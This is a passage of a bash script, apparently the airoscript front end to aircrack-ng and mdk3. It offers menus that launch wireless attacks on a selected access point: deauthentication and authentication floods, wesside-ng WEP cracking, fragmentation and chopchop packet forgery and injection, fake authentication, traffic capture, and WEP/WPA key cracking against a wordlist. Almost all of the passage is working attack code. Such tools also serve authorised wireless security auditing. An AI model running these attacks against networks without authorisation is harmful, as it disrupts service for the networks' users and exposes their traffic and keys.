					1 ) mdkpain ; break ;;
					2 ) mdktargetedpain ; break ;;
					3 ) mdknewtarget ; break ;;
					4 ) mdkauth ; break ;;
					5 ) break ;;
					* ) echo "unknown response. Try again" ;;
				esac
			done 
		}
	
			function mdkpain {
				$TERMINAL -hold $TOPLEFTBIG $TITLEFLAG "`gettext 'MDK attack'`" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG mdk3 $WIFI d & choosemdk
			}
			
			function mdktargetedpain {
				$TERMINAL -hold $TOPLEFTBIG $TITLEFLAG "`gettext 'MDK attack on AP:'` $Host_SSID" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG mdk3 $WIFI p -b a -c $Host_CHAN -t $Host_MAC & choosemdk
			}
			
			function mdknewtarget {
				ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
				head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
				clear
				echo "        Detected Access point list"
				echo ""
				echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
				echo ""
				i=0
				while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
					longueur=${#MAC}
					if [ $longueur -ge 17 ]; then
					i=$(($i+1))
					echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
					aidlenght=$IDLENGTH
					assid[$i]=$ESSID
					achannel[$i]=$CHANNEL
					amac[$i]=$MAC
					aprivacy[$i]=$PRIVACY
					aspeed[$i]=$SPEED
					fi
				done < $DUMP_PATH/dump-02.txt
				echo ""
				echo "        Select target               "
				read choice
					idlenght=${aidlenght[$choice]}
					ssid=${assid[$choice]}
					channel=${achannel[$choice]}
					mac=${amac[$choice]}
					privacy=${aprivacy[$choice]}
					speed=${aspeed[$choice]}
					Host_IDL=$idlength
					Host_SPEED=$speed
					Host_ENC=$privacy
					Host_MAC=$mac
					Host_CHAN=$channel
					acouper=${#ssid}
					fin=$(($acouper-idlength))
					Host_SSID=${ssid:1:fin}
					choosemdk
			}

			function mdkauth {
				$TERMINAL $HOLD $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack on AP:'` $Host_SSID" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG mdk3 $WIFI a & choosemdk
			}
	
	# 6.
		function choosewesside {
			while true; do
				clear
				echo -e "`gettext \"
				#######################################
				###   Choose Wesside-ng Options     ###
				###                                 ###
				###   1) No arguments               ###
				###   2) Selected target            ###
				###   3) Sel. target max rertransmit###
				###   4) Sel. target poor connection###
				###   5) Select another target      ###
				###   6) Return to main menu        ###
				###                                 ###
				#######################################\"`"
			
				read yn

				case $yn in
					1 ) wesside ; break ;;
					2 ) wessidetarget ; break ;;
					3 ) wessidetargetmaxer ; break ;;
					4 ) wessidetargetpoor ; break ;;
					5 ) wessidenewtarget ; break ;;
					6 ) break ;;
					* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
				esac
			done 
		}


			function wesside {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
				$TERMINAL -hold $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'`" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -i $WIFI & choosewesside
			}

			function wessidetarget {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
				$TERMINAL -hold $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'` ($Host_SSID)" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -v $Host_MAC -i $WIFI & choosewesside
			}

			function wessidetargetmaxer {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
				$TERMINAL -hold $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'` ($Host_SSID)" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -v $Host_MAC -k 1 -i $WIFI & choosewesside
			}

			function wessidetargetpoor {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
				$TERMINAL -hold $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'` ($Host_SSID)" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -v $Host_MAC -k 3 -i $WIFI & choosewesside
			}

			function wessidenewtarget {
				rm -rf prga.log
				rm -rf wep.cap
				rm -rf key.log
				ap_array=`cat $DUMP_PATH/dump-01.txt | grep -a -n Station | awk -F : '{print $1}'`
				head -n $ap_array $DUMP_PATH/dump-01.txt &> $DUMP_PATH/dump-02.txt
				clear
				echo -e "`gettext\"        Detected Access point list\"`"
				echo ""
				echo " #      MAC                      CHAN    SECU    POWER   #CHAR   SSID"
				echo ""
				i=0
				while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY;do 
				longueur=${#MAC}
				if [ $longueur -ge 17 ]; then
					i=$(($i+1))
					echo -e " "$i")\t"$MAC"\t"$CHANNEL"\t"$PRIVACY"\t"$POWER"\t"$IDLENGTH"\t"$ESSID
					aidlenght=$IDLENGTH
					assid[$i]=$ESSID
					achannel[$i]=$CHANNEL
					amac[$i]=$MAC
					aprivacy[$i]=$PRIVACY
					aspeed[$i]=$SPEED
				fi
				
				done < $DUMP_PATH/dump-02.txt
					echo ""
					echo -e "`gettext \"       Select target               \"`"
					read choice
						idlenght=${aidlenght[$choice]}
						ssid=${assid[$choice]}
						channel=${achannel[$choice]}
						mac=${amac[$choice]}
						privacy=${aprivacy[$choice]}
						speed=${aspeed[$choice]}
						Host_IDL=$idlength
						Host_SPEED=$speed
						Host_ENC=$privacy
						Host_MAC=$mac
						Host_CHAN=$channel
						acouper=${#ssid}
						fin=$(($acouper-idlength))
						Host_SSID=${ssid:1:fin}
						$TERMINAL -hold $TOPLEFTBIG $TITLEFLAG "`gettext 'Wesside-ng attack'` ($Host_SSID9" $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $EXECFLAG wesside-ng -v $Host_MAC -i $WIFI & choosewesside
			}

	# 7.
	# starts monitor mode on selected interface		
	function monitor_interface {
		if [ "$TYPE" = "RalinkUSB" ]
		then
			IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
			iwconfig $WIFI mode monitor
			echo $IS_MONITOR
	
		elif [ "$TYPE" = "Ralinkb/g" ]
		then
			IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
			echo $IS_MONITOR
			iwpriv $WIFI rfmontx 1
			iwpriv $WIFI forceprism 1
	
		elif [ "$TYPE" = "Atherosmadwifi-ng" ]
		then
			IS_MONITOR=`$AIRMON start wifi0 |grep monitor`
			$AIRMON stop ath0
			$AIRMON stop ath1
			$AIRMON stop ath2
			echo $IS_MONITOR
		else
			IS_MONITOR=`$AIRMON start $WIFI |grep monitor`
			echo "Running standard monitor mode command"
			echo $IS_MONITOR
		fi 
	}


	# 8.
	function airmoncheck {
		if [ "$TYPE" = "RalinkUSB" ]
		then
			$AIRMON check $WIFI
			echo ""
		elif [ "$TYPE" = "Ralinkb/g" ]
		then
			$AIRMON check $WIFI
			echo ""
		elif [ "$TYPE" = "Atherosmadwifi-ng" ]
		then
			$AIRMON check wifi0
			echo ""
		else
			$AIRMON check $WIFI
			echo ""
		fi 
	}

##################################################################################
##################################################################################
######################### This is for iNJECTION  (8)  option:       ################################
##################################################################################
##################################################################################
function injectmenu {
	while true; do
		echo -e "`gettext \"
		#######################################
		###  If previous step went fine     ###
		###  Select next, otherwise hit5    ###
		###                                 ###
		###   1) Frag injection             ###
		###   2) Frag with client injection ###
		###   3) Chochop injection          ###
		###   4) Chopchop with client inj.  ###
		###   5) Return to main menu        ###
		###                                 ###
		#######################################\"`"	
		read yn
		echo ""
		case $yn in
			1 ) fragnoclientend ; break ;;
			2 ) fragmentationattackend ; break ;;
			3 ) chopchopend ; break ;; 
			4 ) chopchopclientend ; break ;;
			5 ) break ;;
			* ) echo "unknown response. Try again" ;;
		esac
	done 
}


	function fragnoclientend {
		$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext 'Injecting forged packet on'` $Host_SSID" $EXECFLAG $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $WIFI & menufonction
	}

	function fragmentationattackend {
		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -y fragment-*.xor -w $DUMP_PATH/frag_$Host_MAC.cap
		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$INJECTION_COLOR" $TITLEFLAG "`gettext 'Injecting forged packet on'` $Host_SSID" $EXECFLAG $AIREPLAY -2 -r $DUMP_PATH/frag_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
	}

	function chopchopend {
		rm -rf $DUMP_PATH/chopchop_$Host_MAC*
		$ARPFORGE -0 -a $Host_MAC -h $FAKE_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor	
		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Sending chopchop to:'` $Host_SSID" $EXECFLAG $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $FAKE_MAC -x $INJECTRATE $WIFI & menufonction
	}
	
	function chopchopclientend {
		rm -rf $DUMP_PATH/chopchop_$Host_MAC*
		$ARPFORGE -0 -a $Host_MAC -h $Client_MAC -k $Client_IP -l $Host_IP -w $DUMP_PATH/chopchop_$Host_MAC.cap -y *.xor
		$TERMINAL $HOLD $BOTTOMLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DEAUTH_COLOR" $TITLEFLAG "`gettext 'Sending chopchop to:'` $Host_SSID" $EXECFLAG $AIREPLAY --interactive -r $DUMP_PATH/chopchop_$Host_MAC.cap -h $Client_MAC -x $INJECTRATE $WIFI & menufonction
	}

###########################################
#############Called directly from the menu.###########
###########################################
function setinterface {
	#INTERFACES=`iwconfig|grep --regexp=^[^:blank:].[:alnum:]|awk '{print $1}'`
	#INTERFACES=`iwconfig|egrep "^[a-Z]+[0-9]+" |awk '{print $1}'`
	INTERFACES=`ip link |egrep "^[0-9]+" | cut -d':' -f 2 | cut -d' ' -f 2 | grep -v "lo" |awk '{print $1}'`
	if [ "$WIFI" = "" ]
	then
		echo "`gettext \"=> Select your interface: \(athX for madwifi devices\)\"`"
		echo ""
		
		select WIFI in $INTERFACES; do
			break;
		done

		TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $2 $3}'`
		clear
		
		echo -e "`gettext \"Interface used is : $WIFI\"`"
		echo -e "`gettext \"Interface type is : $TYPE\"`"
		testmac
	else
		TYPE=`$AIRMON start $WIFI | grep monitor |awk '{print $2 $3}'`
		clear
		
		echo -e "`gettext \"Interface used is : $WIFI\"`"
		echo -e "`gettext \"Interface type is : $TYPE\"`"
		testmac 
	fi
}

# Test fake mac.
function testmac {
	if [ "$TYPE" = "Atherosmadwifi-ng" ]
	then
		echo "Previous fake_mac : $FAKE_MAC"
		FAKE_MAC=`ifconfig $WIFI | grep $WIFI | awk '{print $5}' | cut -c -17  | sed -e "s/-/:/" | sed -e "s/\-/:/"  | sed -e "s/\-/:/" | sed -e "s/\-/:/" | sed -e "s/\-/:/"`
		echo -e "`gettext \"Changed fake_mac : $FAKE_MAC\"`" 
		else
		echo ""
	fi
}

# This is another great contribution from CurioCT that allows you to manually enter SSID if none is set
function blankssid {
	while true; do
		clear
		echo -e "`gettext \"
		#######################################
		###       Blank SSID detected       ###
		###    Do you want to in put one    ###
		###    1) Yes                       ###
		###    2) No                        ###\"`"
		read yn
		case $yn in
			1 ) Host_ssidinput ; break ;;
			2 ) Host_SSID="" ; break ;;
			* ) echo "unknown response. Try again" ;;
		esac
	done
}

function target {
	echo -e "`gettext \"
	######################################
	###
	###   AP SSID   = $Host_SSID
	###   AP MAC    = $Host_MAC
	###   AP Chan   =$Host_CHAN
	###   ClientMAC = $Client_MAC
	###   FakeMAC 	= $FAKE_MAC
	###   AP Encrypt= $Host_ENC
	###   AP Speed  =$Host_SPEED
	###
	#######################################\"`"
}  

function checkdir {
if [[ -d $DUMP_PATH ]]
then
echo -e "        Output folder is $DUMP_PATH"
echo ""
else
echo -e "`gettext \"        Output folder does not exist, i will create it now\"`"
mkdir $DUMP_PATH
echo -e "`gettext \"        Output folder is now set to $DUMP_PATH\"`"
fi
}


function reso {
	while true; do
		echo -e "`gettext \"   Select screen resolution            \"`"
		echo "### 1) 640x480			    ###"
		echo "### 2) 800x480                      ###"
		echo "### 3) 800x600                      ###"
		echo "### 4) 1024x768                     ###"
		echo "### 5) 1280x768                     ###"
		echo "### 6) 1280x1024                    ###"
		echo "### 7) 1600x1200                    ###"
		read yn
		case $yn in
			1 ) TLX="83";TLY="11";TRX="60";TRY="18";BLX="75";BLY="18";BRX="27";BRY="17";bLX="100";bLY="30";bRX="54";bRY="25"; setterminal; break;;
			2 ) TLX="90";TLY="11";TRX="60";TRY="18";BLX="78";BLY="26";BRX="52";BRY="15";bLX="130";bLY="30";bRX="78";bRY="25"; setterminal; break;;
			3 ) TLX="92";TLY="11";TRX="68";TRY="25";BLX="78";BLY="26";BRX="52";BRY="15";bLX="92" ;bLY="39";bRX="78";bRY="24"; setterminal; break;;
			4 ) TLX="92";TLY="14";TRX="68";TRY="25";BLX="92";BLY="36";BRX="74";BRY="20";bLX="100";bLY="52";bRX="54";bRY="25"; setterminal; break;;
			5 ) TLX="100";TLY="20";TRX="109";TRY="20";BLX="100";BLY="30";BRX="109";BRY="20";bLX="100";bLY="52";bRX="109";bRY="30"; setterminal; break;;
			6 ) TLX="110";TLY="35";TRX="99";TRY="40";BLX="110";BLY="35";BRX="99";BRY="30";bLX="110";bLY="72";bRX="99";bRY="40"; setterminal; break;;
			7 ) TLX="130";TLY="40";TRX="68";TRY="25";BLX="130";BLY="40";BRX="132";BRY="35";bLX="130";bLY="85";bRX="132";bRY="48"; setterminal; break;;
			* ) echo -e "`gettext \"Unknown response. Try again\"`" ;;
		esac
	done
}

function setterminal {
	clear
	getterminal
	echo -e "`gettext \"Im going to set terminal options for your terminal now\"`"
	# This way we support multiple terminals, not only $TERMINAL
	case $TERMINAL in 
		xterm|uxterm ) 
			export TOPLEFT="-geometry $TLX*$TLY+0+0 "
			export TOPRIGHT="-geometry $TRX*$TRY-0+0 "
			export BOTTOMLEFT="-geometry $BLX*$BLY+0-0 "
			export BOTTOMRIGHT="-geometry $BRX*$BRY-0-0 "
			export TOPLEFTBIG="-geometry $bLX*$bLY+0+0 "
			export TOPRIGHTBIG="-geometry $bLX*$bLY+0-0 "
			export HOLDFLAG="-hold"
			export TITLEFLAG="-T"
			export FGC="-fg"
			export BGC="-bg"
			export EXECFLAG="-e"
			if [ "$DEBUG" = "1" ]
			then
				echo $TOPLEFT
				echo $TOPRIGHT
				echo $BOTTOMLEFT
				echo $BOTTOMRIGHT
				echo $TOPLEFTBIG
				echo $TOPRIGHTBIG
				printf -- "$EXECFLAG \n"
				echo $HOLDFLAG
				echo $TITLEFLAG
				echo $FGC
				echo $BGC
			fi
			;;
		
		gnome-terminal|gnome-terminal.wrapper ) 
			TOPLEFT="-geometry=$TLX*$TLY+0+0 "
			TOPRIGHT="-geometry=$TRX*$TRY-0+0 "
			BOTTOMLEFT="-geometry=$BLX*$BLY+0-0 "
			BOTTOMRIGHT="-geometry=$BRX*$BRY-0-0 "
			TOPLEFTBIG="-geometry=$bLX*$bLY+0+0 "
			TOPRIGHTBIG="-geometry=$bLX*$bLY+0-0 "
			EXECFLAG="-e "
			HOLDFLAG="" # Apparently, gnome terminal can't be hold that way. 
			TITLEFLAG="-t"
		# Themes disabled for gnome-terminal
			FGC=""
			DUMPING_COLOR=""
			INJECTION_COLOR=""
			ASSOCIATION_COLOR=""
			DEAUTH_COLOR=""
			BACKGROUND_COLOR=""
			BGC=""
			;;
		screen )
			# WARNING, THIS IS FULLY EXPERIMENTAL!!!! Use Screen as your own risk! (may not work)
			TOPLEFT=""
			TOPRIGHT=""
			BOTTOMLEFT=""
			BOTTOMRIGHT=""
			TOPLEFTBIG=""
			TOPRIGHTBIG=""
			EXECFLAG="-c /usr/share/airoscript/screenrc -t airoscript -s" 
			HOLDFLAG=""	
			TITLEFLAG="-t"
			FGC="-fg"
			BGC="-bg"
			;;
	esac
echo -e "\n"

}


# this function allows debugging, called from main menu.
function debug {
	if [ $DEBUG = 1 ]
	then
		echo "`gettext \" 	Debug Mode enabled, you\'ll have to manually close windows\"`"
		HOLD=$HOLDFLAG
	else
		HOLD=""
	fi
}

function getterminal {
	# TERMINAL var is on config if valid, use it, if not set it to defaults, if that fails, use environment terminal, and if that fails too, use xterm :-D, if xterm isnt available, giva a fatal warning and exit (who doesnt have a terminal?)
	if [ -e /usr/bin/$TERMINAL ]
	then
		echo -e "`gettext \"Using configured terminal\"`"
	else
		TERMINAL=`ls -l1 /etc/alternatives/x-terminal-emulator|cut -d ">" -f 2|cut -d " " -f 2|head -n1`;
	fi

	if [ -e /usr/bin/$TERMINAL ] # If there is an alternative for terminal select it.
	then
		D="1" 
	else
		if [ -e $TERM ] 
		then
			echo -e "`gettext \"Using environment defined terminal ($TERM)\n\"`"
			TERMINAL=$TERM
		else
			if [ -e "/usr/bin/xterm" ]
			then
				TERMINAL="xterm"
				echo -e "Using Xterm\n"
			else
			echo -e 
				"`gettext \"I cant find any good terminal, please set one on your conffile
				 Your TERMINAL var contains no valid temrinal
				 Your alternative against x-terminal-emulator contains no terminal
				 Xterm can\'t be found on your system\n\"`"
				exit
			fi
		fi
	fi
}


###########################################
########End of called directly from the menu.  ###########
###########################################

###########################################
########Those three are called from many places.#########
###########################################
	function capture {
		clear
		rm -rf $DUMP_PATH/$Host_MAC*
		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Capturing data on channel'`: $Host_CHAN" $TOPLEFT $BGC "$BACKGROUND_COLOR" $FGC "$DUMPING_COLOR" $EXECFLAG $AIRODUMP --bssid $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI
	}

	function fakeauth {
		$TERMINAL $HOLD $TITLEFLAG "`gettext 'Associating with:'` $Host_SSID " $BOTTOMRIGHT $BGC "$BACKGROUND_COLOR" $FGC "$ASSOCIATION_COLOR" $EXECFLAG $AIREPLAY --fakeauth $AUTHDELAY -q $KEEPALIVE $EXECFLAG "$Host_SSID" -a $Host_MAC -h $FAKE_MAC $WIFI
	}

	function menufonction {
		$TERMINAL $HOLD $TOPRIGHT $TITLEFLAG "`gettext 'Fake function to jump to menu'`" $EXECFLAG echo "Aircrack-ng is a great tool, Mister_X ASPj & HIRTE are GODS"
	}
	
	# This is the input part for ssid. Used for almost two functions. (blankssid and choosetarget)
	function Host_ssidinput {
		echo "#######################################"
		echo -e "`gettext \"###       Please enter SSID         ###\"`"
		read Host_SSID
		set -- ${Host_SSID}
		clear
	}
###########################################
########End of the ones that are called from many places.####
###########################################


################### Warning: I can't find those functions called from anywhere ###########
function witchconfigure {
if [ $Host_ENC = "WEP" ]
  		then
		configure
		else
		wpaconfigure
		fi			
}

function configure {
		$AIRCRACK -a 1 -b $Host_MAC -s -0 -z $DUMP_PATH/$Host_MAC-01.cap &> $DUMP_PATH/$Host_MAC.key 
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
}

function wpaconfigure {
		$AIRCRACK -a 2 -b $Host_MAC -0 -s $DUMP_PATH/$Host_MAC-01.cap -w $WORDLIST &> $DUMP_PATH/$Host_MAC.key
		KEY=`cat $DUMP_PATH/$Host_MAC.key | grep -a KEY | awk '{ print $4 }'`
}